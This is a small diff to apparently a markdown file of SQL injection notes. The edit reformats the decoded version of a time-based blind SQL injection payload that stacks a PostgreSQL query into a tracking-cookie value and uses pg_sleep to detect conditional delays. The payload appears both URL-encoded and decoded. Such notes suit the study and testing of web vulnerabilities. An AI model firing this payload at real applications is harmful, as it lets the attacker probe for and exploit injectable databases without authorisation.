@@ -730,13 +730,14 @@ Check if response is delayed or not:
 > TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 
 this means :
-
-> x';   
-'SELECT CASE     
-WHEN (1=1)  
-THEN pg_sleep(10)   
- ELSE pg_sleep(0)   
-END--
+```
+trackingId = x';   
+                SELECT CASE     
+                WHEN (1=1)  
+                THEN pg_sleep(10)   
+                ELSE pg_sleep(0)   
+                END--;
+```
 
 #### Database and sleep function:
 
